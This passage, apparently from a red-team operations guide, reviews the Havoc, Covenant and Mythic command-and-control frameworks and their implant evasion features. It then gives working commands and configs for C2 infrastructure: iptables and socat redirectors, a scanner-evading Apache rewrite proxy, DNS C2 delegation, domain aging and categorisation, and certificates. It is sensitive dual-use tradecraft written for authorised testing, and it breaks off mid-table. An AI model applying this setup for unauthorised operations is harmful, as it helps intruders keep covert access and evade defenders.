**Implant technology.** Demon's distinguishing feature is that the evasion work is built in and switchable. It implements **sleep obfuscation** using the published timer-queue and APC-based techniques (the Ekko, Foliage and Zilean approaches), so the implant's memory is encrypted while it is idle and a memory scan at rest finds ciphertext rather than shellcode. It supports **indirect syscall** invocation, so the call to the kernel does not originate from a `ntdll` stub that a userland hook is watching, and **return address spoofing**, so a stack walk performed at the moment of a sensitive call does not point at unbacked memory. Injection allocation and execution primitives are configurable. All of this is exactly the class of feature that Cobalt Strike exposes only through kits you must write yourself.

**Transports.** HTTP and HTTPS for egress, SMB named pipes for internal pivoting. There is also a service or external-agent API which lets a third-party process register as an agent handler with the teamserver, which is Havoc's answer to External C2. The transport list is deliberately narrow: there is no DNS channel, which is a real limitation in the environments where DNS is the only thing that leaves.

**Extensibility.** Two mechanisms. Havoc's Demon loads **Beacon Object Files** using the Cobalt Strike Beacon API surface, so the large body of public BOF tooling works with minimal or no modification. And the client exposes a **Python scripting API** for registering commands, reacting to events and driving the interface, which fills the same role as Aggressor Script.

**What it is good at.** Getting a high-quality, evasion-focused implant onto a monitored host without a procurement cycle. Its default in-memory posture is better than an out-of-the-box Cobalt Strike Beacon, because the features you would have to build with kits are already there. The Qt client is pleasant and fast. It is a very good teaching platform for modern implant internals, because the source is readable and the techniques are named and separable.

**Where it falls short.** The built-in post-exploitation set is thin compared with Cobalt Strike or Sliver, so you will lean heavily on BOFs. There is no DNS transport. It is x64 Windows only, so a mixed estate needs something alongside it. And because it is open source and popular, its default artefacts, including the Demon's characteristic patterns and the default profile's HTTP shape, are now covered by detection content just as any public framework's are.

**Current status.** The upstream repository is **archived**, with its last commit in December 2025 and over a hundred issues left open. That is the end of the line for the public version: it is read-only, no pull request will be merged, and there will be no fixes and no adaptation to Windows changes. Treat it as a frozen artefact. It still works and the Demon is still a good implant, so it remains worth reading and worth using where you accept owning any breakage yourself, but do not plan a long engagement around it, and do not expect a public fix for anything you find. Anything you hear about a rewrite or a commercial edition is unconfirmed by the repository itself, so verify it at source before repeating it.

### Covenant

**What it is.** A .NET command and control framework by Ryan Cobb, built around the idea that if your targets run .NET then your implant, your post-exploitation tooling and your tasking should all be .NET too, compiled on demand. It was one of the most important frameworks of its generation and it is no longer maintained.

**Architecture.** A single ASP.NET Core application serving both the operator interface, originally a Blazor web UI, and a REST API, backed by a local database through Entity Framework. Everything runs in one process, which made it trivially easy to deploy, including in Docker. The implant is called a **Grunt**.

```bash
# Historical deployment, from the Covenant/Covenant directory
dotnet run
# Operator UI then served over HTTPS on the loopback interface
```

**Implant technology.** Grunts are C#. The original targeted .NET Framework 4.0 and 4.5, which are present on effectively every Windows host, and later versions added .NET Core Grunts for cross-platform use. A Grunt polls its listener on a configurable delay with a jitter percentage and a connection attempt limit before it gives up, which is a conventional asynchronous beaconing model.

**Extensibility, and the interesting bit.** Covenant's genuinely novel design decision was **Roslyn compilation at task time**. A task is defined as a small piece of C# source with a declared parameter list, held in the Covenant database and editable in the web UI. When you run it, Covenant compiles that source with the Roslyn compiler, produces an assembly, and sends it to the Grunt to load and execute in-process. The consequences were significant for 2019: you could add or modify a capability without rebuilding anything, tasks could be written by anyone who knew C#, and because each task was compiled fresh with a per-operation build, the resulting assemblies were not byte-identical to a published sample. It also meant the entire .NET offensive ecosystem could be wrapped as a task with a few lines of glue.

The complementary mechanisms were **Templates**, which controlled how the Grunt itself was generated, and **Profiles**, which shaped the HTTP communication. Covenant's profiles used JavaScript functions to transform messages in both directions, which was a lighter-weight but conceptually similar answer to malleable profiles: you could rewrite the request and response bodies arbitrarily, change URIs and set headers.

**Listeners and delivery.** An HTTP listener, optionally with a certificate for HTTPS, and a **Bridge** listener, which was Covenant's external C2 mechanism: an arbitrary transport implemented outside Covenant that relayed messages to the bridge. Peer-to-peer worked through SMB named pipe Grunts, so a Grunt with no egress could be reached through one that had it. Delivery came from **Launchers**, a set of generators producing a binary, raw shellcode via Donut, PowerShell, and a range of the signed-binary execution vectors that were fashionable at the time: MSBuild, InstallUtil, mshta, regsvr32, wmic and the Windows Script Host. Most of those launchers are now the loudest possible way to start a process on an instrumented Windows host, which is a fair summary of what changed between then and now.

**What it was good at.** Rapid capability development in C#, an easy multi-operator web UI, in-process execution of the .NET tool ecosystem, and a tracked object model that recorded credentials, indicators and tasks properly. Its indicator tracking, an explicit list of the artefacts an operation had generated, was ahead of its time and is a feature more frameworks should copy.

**Current status: archived and unmaintained.** The project has been retired by its author. That matters more than it would for most software, for three reasons. The .NET Framework Grunt is one of the most thoroughly signatured implants in existence, on disk and in memory, and there is nobody making it less so. Roslyn-compiled task assemblies are loaded through the CLR, which means AMSI inspects them and ETW reports them, and the framework has not been updated for a decade of .NET telemetry improvements. And nothing will be fixed. Learn from the design, do not deploy it. If you want a .NET-centric framework today, look at **HardHat**, at **Mythic with the Apollo agent**, or at **Empire's C# agent**, all of which are maintained.

### Mythic

**What it is.** A C2 framework by Cody Thomas that inverts the usual relationship between framework and implant. Mythic's core provides operator interface, database, logging, task queues, file storage and an API, and it deliberately knows nothing about any specific implant or transport. Agents and C2 profiles are separate projects, each running in its own container, that register their capabilities with the core over a message bus. It is one of the two or three most important frameworks in current use and the source's list mentions it only as a name.

**The architecture, because it is the point.** Mythic runs as a set of Docker containers orchestrated by *mythic-cli*. The core containers are the server itself, a PostgreSQL database, a RabbitMQ broker, a GraphQL API layer (Hasura) and a React web interface. On top of those you install:

- **Payload type containers.** One per agent. The container holds the agent's source code, its build logic, and the definition of every command it supports, including each command's parameters, its help text, its ATT&CK mapping, and optionally a browser script that renders its output as a table or a tree rather than as raw text. When you request a payload, Mythic asks the container to build it, and the container returns an artefact.
- **C2 profile containers.** One per transport. The container holds the server-side listener implementation and the client-side configuration schema. An HTTP profile container runs a web server; an SMB profile container handles named pipe relaying.
- **Translation containers.** Optional, and the piece that makes the architecture genuinely general. Mythic's core speaks a defined JSON message format. If your agent's wire format is something else entirely, a custom binary protocol, protobuf, whatever you like, you write a translation container that converts between your format and Mythic's. The core is then completely indifferent to what your implant actually sends.

The consequence is that adding a new agent or a new transport is a change to an independent repository, not a fork of the framework. Installation is a command:

```bash
# Bring up the core
sudo ./mythic-cli start

# Install an agent and a transport
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http

sudo ./mythic-cli status
```

**Implant technology: several, deliberately.** Because agents are independent, Mythic is the only major framework where "what language is the implant" has no single answer. The set changes as the community adds to it, and the ones you will meet most often are:

| Agent | Language | Platform focus | Notes |
| --- | --- | --- | --- |
| Apollo | C#, .NET Framework | Windows | The mature Windows workhorse. Deep post-exploitation set, BOF and .NET assembly execution, SOCKS, named pipe pivoting. The closest thing Mythic has to a Beacon. |
| Athena | C#, .NET (Core) | Cross-platform | Modular, plugin-loading design, runs on Windows, Linux and macOS. |
| Poseidon | Go | Linux and macOS | The standard choice for non-Windows targets. |
| Freyja | Go | Cross-platform | Go agent with a broad command set. |
| Medusa | Python | Cross-platform | Useful where an interpreter is expected. |
| Thanatos | Rust | Windows and Linux | Small footprint, less mature detection coverage against Rust generally. |
| Merlin | Go | Cross-platform | The standalone framework, packaged as a Mythic agent. |

Treat that table as indicative rather than exhaustive, and check the MythicAgents organisation for the current set and each agent's own maintenance state, because agents are maintained independently of the core and some are dormant while others are very active.

**Transports.** Likewise a per-container question. The commonly used profiles are plain HTTP, a more configurable HTTP variant with per-message transform support that brings it closer to a malleable profile, websockets, dynamic HTTP with configurable request shaping, DNS, and the internal-only SMB and TCP profiles for peer-to-peer linking. Because the profile is a container with a schema, adding a transport that carries frames over a third-party service is a normal thing to do rather than an exotic one.

**Extensibility.** Three levels, and knowing which one you need saves a lot of time. Adding a **command** to an existing agent means writing the command definition in the payload type container and the corresponding handler in the agent source: this is the common case and it is well documented. Adding a **new agent** means creating a payload type container from a template, which is more work but is a supported, first-class activity and is the reason people choose Mythic for research. Adding a **transport** means a new C2 profile container. Beyond that, the server exposes a scripting interface and a GraphQL API, so automation and integration with other tooling is straightforward, and newer versions added an eventing system for triggering workflows on conditions.

**What it is good at.** Heterogeneous operations, where one console needs to manage Windows, Linux and macOS implants with different capabilities. Development and research, because the container boundary means you can iterate on an agent without touching the framework. Logging and attribution, because every task, parameter and output is recorded in PostgreSQL against an operator identity, with ATT&CK mappings attached, which produces a genuinely useful audit trail and a report annex almost for free. Multi-tenancy, because it supports separate operations with separate operator sets on one instance. And output rendering: browser scripts turning a directory listing or a process tree into a structured view is a small thing that saves hours.

**Where it falls short.** The operational overhead is real: Docker, several containers, a database, a message broker, and a *mythic-cli* you need to know. Resource requirements are higher than a single-binary framework. Debugging is harder because a failure could be in the core, the payload container, the translation container or the profile container. Capability is uneven across agents, so "Mythic can do X" is always really "this agent can do X". And the community agents are exactly as evasive as their individual authors made them, so evaluate the specific agent's memory behaviour rather than trusting the framework's reputation.

**Current status.** Actively developed and maintained, with an engaged community and a steady stream of agent and profile updates. Along with Sliver it is one of the two open source frameworks it is safe to build a practice around.

### Infrastructure design

The source says nothing at all about infrastructure, and this is the most consequential omission in its C2 coverage. Framework choice is a preference; infrastructure design is what determines whether a single detection ends the engagement or costs you one redirector. Everything in this section follows from one principle: **assume every component you expose will eventually be identified, and arrange things so that identifying any one component teaches the defender as little as possible and costs you as little as possible.** One extra placeholder is used throughout this part: `$C2DOMAIN` is a domain you own and operate for the engagement, as distinct from `$DOMAIN`, which everywhere else in this document is the target's Active Directory domain.

#### Why the team server is never exposed

Put a team server directly on the internet with its listener on 443 and you have created a single object which, when found, gives up everything: the framework and version, the profile, the certificate, the payload if staging is on, the operator port, and an IP address that is now permanently associated with your operation and can be searched backwards through passive DNS and scan history.

The **redirector** pattern separates the thing that must be reachable from the thing that holds state. A redirector is a cheap, disposable host whose only job is to accept implant traffic and forward it to the team server over a path that is not visible from the target network. Implants are configured with the redirector's domain. The team server accepts connections only from its redirectors, on a specific port, ideally over a private network or an authenticated tunnel.

What you gain:

- **Compartmentalisation.** A burned redirector costs you a domain, a VPS and the implants pointing at it. The team server, its database, its loot and every other channel survive.
- **Rotation.** You can add a new redirector and a new domain, migrate implants that support a callback change, and retire the old one, all without touching the team server.
- **Filtering.** A redirector can inspect traffic and decide what to forward, which is the difference between answering a scanner and ignoring it. More on this below.
- **Reputation borrowing.** A redirector can live behind a CDN or in a cloud provider's address space that the target already trusts.
- **Attribution distance.** The address the target sees has never been used for anything else and holds nothing.

The team server itself sits behind a default-deny firewall permitting only SSH from your management addresses and the C2 port from your redirectors' addresses. Operators reach the client port through an SSH forward. If the framework's operator interface is a web UI, it binds to loopback and you forward that.

#### Dumb relay versus filtering redirector

This distinction is the single most useful thing in this section and it is routinely got wrong.

A **dumb relay** is a layer 4 port forward. It copies bytes between two sockets and understands nothing. It is trivial to set up, works for any protocol including DNS and raw TCP, and adds essentially no latency.

**What it is.** Kernel-level NAT or a userspace socket relay that forwards a port to the team server.

**Why it works.** The redirector rewrites the destination address of inbound packets and the source address of outbound ones, so the implant's connection terminates at the team server while the target only ever sees the redirector's address.

**Preconditions.** Root on the redirector, IP forwarding enabled for the iptables method, and the team server reachable from the redirector.

**Commands.**

```bash
# Kernel NAT method, HTTPS
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $TEAMSERVER:443
iptables -t nat -A POSTROUTING -j MASQUERADE

# DNS needs both transports
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $TEAMSERVER:53
iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $TEAMSERVER:53

# Userspace method, no forwarding required
socat TCP4-LISTEN:443,fork,reuseaddr TCP4:$TEAMSERVER:443
socat UDP4-RECVFROM:53,fork,reuseaddr UDP4-SENDTO:$TEAMSERVER:53
```

**Verify it worked.** From an external host, confirm the port answers and that the response is the team server's. For an HTTPS listener, compare the presented certificate to the one the team server holds. Then check the team server's own logs show the connection arriving with the redirector's source address, not the client's, which confirms the NAT path.

**Detection and opsec.** A dumb relay forwards everything, which means an internet-wide scan, a security vendor's crawler or a curious analyst reaches your team server directly and gets the team server's real response, its real TLS fingerprint and its real error pages. This is how team servers behind "protected" redirectors end up tagged in Censys and Shodan anyway. Kernel NAT also means the team server sees the redirector's address as the source for every implant, so you lose the implant's true source address in your own logs, which hurts your own situational awareness.

**Failure modes.** With the iptables method, forgetting `ip_forward` produces a connection that hangs rather than fails. Forgetting the `POSTROUTING` rule means reply packets take a route the team server's stack will not accept. With socat, UDP relaying for DNS is stateless and fragile under load, and a single socat process without `fork` handles one connection and then exits. Cloud provider network configuration also matters: some providers require you to disable source and destination checking on the instance before it will forward packets that are not addressed to it.

A **filtering redirector** is a layer 7 reverse proxy that understands the protocol and applies policy. It is more work and it is the correct choice for any HTTP or HTTPS channel.

**What it is.** A web server that inspects each request and forwards only requests that conform to your profile, sending everything else somewhere harmless.

**Why it works.** Your profile defines exactly which URIs, methods, user agents and headers a real implant produces. Anything that does not match that specification is, by definition, not your implant. A scanner probing `/`, a crawler requesting `/robots.txt`, an analyst pasting the domain into a browser, and a sandbox replaying a captured URI with the wrong user agent all fail the test. They get a redirect to a real website, or a plausible page, and learn nothing. Your team server is never touched by anything except conforming traffic.

**Preconditions.** A domain pointing at the redirector, a valid certificate, the web server's proxy and rewrite modules, and the profile you are actually going to run so the rules match it.

**Commands.**

```bash
apt install -y apache2
a2enmod rewrite proxy proxy_http ssl headers deflate
```

```apache
# /etc/apache2/sites-enabled/redirector.conf, inside the :443 VirtualHost
SSLProxyEngine On
SSLProxyCheckPeerCN off
SSLProxyCheckPeerName off
SSLProxyCheckPeerExpire off

RewriteEngine On

# Only the URIs this operation's profile actually uses
RewriteCond %{REQUEST_URI} ^/(api/v2/session/status|api/v2/session/report|assets/app\.[a-f0-9]{8}\.js)$
# Only the exact user agent the payloads were built with
RewriteCond %{HTTP_USER_AGENT} "^Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\).*Chrome/126\.0\.0\.0 Safari/537\.36$"
RewriteRule ^.*$ https://$TEAMSERVER%{REQUEST_URI} [P,L]

# Everything else goes to a real site and never sees the team server
RewriteRule ^.*$ https://www.example.com/ [L,R=302]
```

**Verify it worked.** Two tests. A request that matches your profile must reach the team server, which you confirm in the team server's log. A request that does not, `curl -k https://c2.$C2DOMAIN/` with a default user agent, must receive the redirect and must produce nothing at all in the team server's log. Test with a genuinely wrong user agent and a genuinely wrong URI separately, because a rule that matches on either rather than both is a common mistake.

**Detection and opsec.** This is the configuration that survives contact with scanners. Its weaknesses are that it only helps for HTTP and HTTPS, that a mistake in the regular expression silently breaks your channel, and that the decoy destination should be something plausible rather than a well-known unrelated site. Consider also stripping or normalising headers that the proxy adds: a `X-Forwarded-For` header appearing in your team server logs is useful to you, but any header that leaks the internal topology into a response is not.

Purpose-built tooling exists and is worth using rather than hand-rolling for a long operation. **cs2modrewrite** generates mod_rewrite rules directly from a Cobalt Strike malleable profile, which removes the class of bug where your rules and your profile drift apart. **RedWarden** is a profile-aware redirector that additionally filters on source address and known security vendor address ranges. **RedElk** is a different thing and equally valuable: it aggregates redirector and team server logs into a searchable store, alerts on your own indicators being probed, and enriches source addresses so you can see when a security vendor or the client's blue team starts looking at your infrastructure.

**Failure modes.**

- `SSLProxyEngine` not enabled: the proxy rule silently fails or returns a 500 because Apache will not originate an HTTPS connection.
- Team server presenting a self-signed certificate with the peer checks left on: proxy errors on every request. Turning the checks off is correct here, because the internal leg's certificate is irrelevant.
- The rewrite conditions do not match the profile: implants get a 302 instead of tasks, the session never establishes, and the team server log is empty, which is a confusing symptom because nothing appears broken on the team server at all.
- `[P]` without `proxy_http` loaded: Apache treats it as a normal rewrite and serves a local 404.
- Regular expression escaping: an unescaped `.` in a user agent match is usually harmless, an unescaped `?` or `(` is not.

#### CDN and reputable-address fronting

The historical trick, classic **domain fronting**, sent a TLS handshake with an SNI naming a high-reputation domain on a CDN and an HTTP `Host` header naming your own distribution on that same CDN, so a network monitor saw a connection to a trusted name. The major providers closed this in 2018 by enforcing that the SNI and the `Host` match, and it should be treated as dead.

What still works is **legitimate CDN pass-through**: you register your own domain, put it behind a large CDN or an edge compute platform, and configure the origin as your redirector. The implant then connects to a CDN address in a very large, very reputable address block, with a valid certificate issued to your domain, and the CDN forwards to your origin. You are not spoofing anything; you are simply a customer. The benefits are real: destination IP reputation becomes the CDN's, the address is shared with a vast amount of legitimate traffic so IP blocking is expensive for the defender, TLS is terminated by the CDN so your fingerprint on the target's side is the CDN's, and the CDN's own edge absorbs scanning.

Edge compute and serverless platforms extend the same idea: a small function on a cloud provider's serverless platform, an API gateway, or an edge worker can act as the redirector, so the callback destination is a hostname belonging to a major cloud provider that the target almost certainly already permits. The trade-offs are provider terms of service, logging on the provider's side, request size and duration limits, and cost that scales with the number of implant check-ins.

#### DNS infrastructure

A DNS channel needs delegation, not a port forward, and this is where most first attempts fail.

**What it is.** You own a domain and delegate a subdomain, or the whole zone, to a name server that your C2 controls, so that queries for names under it arrive at your framework.

**Why it works.** DNS resolution is recursive and hierarchical. When a host asks its configured resolver for `md.abc123.c2.$C2DOMAIN`, that resolver walks down from the root, finds that `c2.$C2DOMAIN` is delegated by an NS record to a name server you control, and forwards the query there. The implant never talks to your server directly; the target's own resolver does it on the implant's behalf, which is why DNS gets out of environments where nothing else does. The implant encodes data into query labels and the server encodes replies into the answer records.

**Preconditions.** A registered domain, access to its DNS management, a host with UDP and TCP 53 free (which means disabling any local resolver stub that has already bound it), and outbound DNS permitted from the target to its own internal resolver, which it almost always is.

**Commands and records.** At the registrar or authoritative provider, create a glue record and a delegation:

```text
ns1.$C2DOMAIN.    A    <redirector-or-teamserver-ip>
ns2.$C2DOMAIN.    A    <second-ip>
c2.$C2DOMAIN.     NS   ns1.$C2DOMAIN.
c2.$C2DOMAIN.     NS   ns2.$C2DOMAIN.
```

On the host, make sure nothing else owns port 53:

```bash
ss -lunp | grep ':53'
systemctl disable --now systemd-resolved   # then fix /etc/resolv.conf
```

Then either run the framework's DNS listener on that host, or relay to the team server with the DNS rules from the dumb relay section above.

**Verify it worked.** Query your own delegation from an external network and confirm the answer comes from your server:

```bash
dig +trace ns1.$C2DOMAIN
dig @1.1.1.1 test.c2.$C2DOMAIN TXT
dig @$DC test.c2.$C2DOMAIN TXT     # from inside, through the target's own resolver
```

The third test is the one that matters, because it proves the target's resolver will actually recurse for your zone. If it answers from a cache-only internal resolver that forwards to an upstream you cannot reach, the channel will not work regardless of how correct your delegation is.

**Detection and opsec.** DNS C2 is the loudest channel in this section from a detection perspective and the hardest one to block. A single second-level domain receiving thousands of queries with unique, high-entropy, maximum-length subdomain labels, an unusual proportion of TXT or NULL record types, and a query-to-response byte ratio nothing like normal browsing, is a textbook signature and every DNS security product looks for it. Mitigate what you can: keep the subdomain prefixes plausible, set the idle response address to something innocuous so unrelated queries get a benign answer, restrict the maximum data per query so labels are not always maximum length, and use DNS strictly as a long-haul or last-resort channel with a very long sleep rather than as a working channel. Also remember that the query arrives at your server from the target's resolver, so you see the resolver's address and not the host's; on a large estate you may not be able to tell which host you are talking to from network data alone.

**Failure modes.** A local resolver stub holding port 53 causes the listener to fail to bind, sometimes silently. Missing glue records mean the delegation cannot be followed. TTL and registrar propagation delays mean a new delegation may take hours to be usable. A target environment where clients may only query an internal resolver that blocks or does not recurse for unknown external zones kills the channel outright. And some frameworks require both UDP and TCP 53, because responses that exceed the UDP size limit retry over TCP.

#### Domains, categorisation and reputation

A freshly registered domain is a liability, not an asset. Web proxies and DNS security products maintain a **newly registered domain** category and a very large number of organisations block it outright as a matter of policy, because almost all malicious infrastructure is new. Even where it is not blocked, "first time this organisation has ever resolved this domain, and it was registered nine days ago" is one of the highest-value signals a defender has.

Three approaches, in increasing order of effort and effectiveness.

**Age and categorise a new domain.** Register it, point it at a real-looking website with real content, let it be crawled, and submit it for categorisation to the URL filtering vendors that maintain review pages. Give it weeks, not days. This works, and it needs to be planned before the engagement starts rather than the morning you need a callback.

**Acquire an expired domain with existing history.** A domain that expired but retains an established registration date, an existing category, and inbound links, sidesteps the newly-registered problem entirely. Tooling exists to hunt for these: **domainhunter**, **CatMyFish** and **Chameleon** all automate the search for expired or expiring domains with a desirable existing categorisation. Check what the domain was previously used for; inheriting a category is good, inheriting a reputation as a malware host is not.

**Match the target's expectations.** Better than a generically clean domain is one that fits. A domain that plausibly belongs to a supplier, a cloud service, a marketing platform or a software vendor the target already deals with will pass both automated and human review far more comfortably than an unrelated but technically clean one. Combine that with a category the target's proxy policy actually permits, checked against their real policy if you can determine it.

Whichever route you take, verify the category before you commit. The major filtering vendors publish lookup pages for their own categorisations, though several have restricted or removed them over the years, so treat any one lookup as advisory. Also check your candidate domains and, once built, your redirector addresses against public threat feeds and C2 tracking projects. If your infrastructure appears on a public C2 tracker, it is burned before you start, and finding that out yourself is much cheaper than finding it out from the client.

Finally, the geography and hosting choices are part of reputation. Traffic from a target in one country to a small hosting provider in another that the organisation has no business relationship with is anomalous on its own. Prefer address space that fits: the target's own region, a mainstream cloud provider, or a CDN. Avoid providers with a reputation for abuse tolerance, because entire ASNs get blocked.

#### Certificates and Certificate Transparency

An HTTPS listener needs a certificate that a target host will accept. Provision it properly.

```bash
certbot certonly --standalone -d c2.$C2DOMAIN
```

For a Java-based team server that wants a keystore rather than PEM files, the conversion is two steps:

```bash
openssl pkcs12 -export \
  -in /etc/letsencrypt/live/c2.$C2DOMAIN/fullchain.pem \
  -inkey /etc/letsencrypt/live/c2.$C2DOMAIN/privkey.pem \
  -out /opt/cs/c2.p12 -name teamserver -passout pass:$PASS

keytool -importkeystore -srcstoretype PKCS12 \
  -srckeystore /opt/cs/c2.p12 -srcstorepass $PASS -alias teamserver \
  -destkeystore /opt/cs/c2.store -deststorepass $PASS -destkeypass $PASS
```

Then reference it from the profile:

```text
https-certificate {
    set keystore "c2.store";
    set password "$PASS";
}
```

Two things to understand about this.

**Certificate Transparency is a public log.** Every certificate a public CA issues is submitted to CT logs, and those logs are searchable by anyone in real time. Multiple services exist purely to alert on new certificates matching a string, and mature security teams monitor CT for their own brand names and for typo-variants of them. Consequences: never put a client's name, a product name, or anything else operationally revealing in a certificate you get from a public CA, and expect that the existence of `c2.$C2DOMAIN` becomes public knowledge within minutes of issuance. A wildcard certificate reduces what you leak, because it publishes the parent domain rather than every hostname you use under it.

**Terminate TLS at the edge.** If the redirector or CDN holds the publicly trusted certificate and the internal leg to the team server uses a self-signed one, then the certificate the target sees is correct and the team server never needs a public certificate at all. This also means a rotation of the edge certificate does not touch the team server.

What you must not do is leave the framework's default self-signed certificate in place on anything an implant connects to. Default certificate subject fields are published detection content, and an HTTPS connection to a random hostname presenting a certificate whose subject reads like an offensive security product is the easiest catch in this document.

#### Tiering: separating what can burn

The core discipline is that different activities have wildly different detection risk, and mixing them means the riskiest one determines the fate of all of them. Separate infrastructure by function and by expected lifetime.

| Tier | Purpose | Risk profile | Lifetime |
| --- | --- | --- | --- |
| Delivery and phishing | Sending mail, hosting the lure and the payload | Highest. This is what gets reported by users and inspected by mail security. | Hours to days |
| Staging | Retrieving second-stage payloads, if you stage at all | High. The artefact is fetched by unknown parties and analysed. | Days |
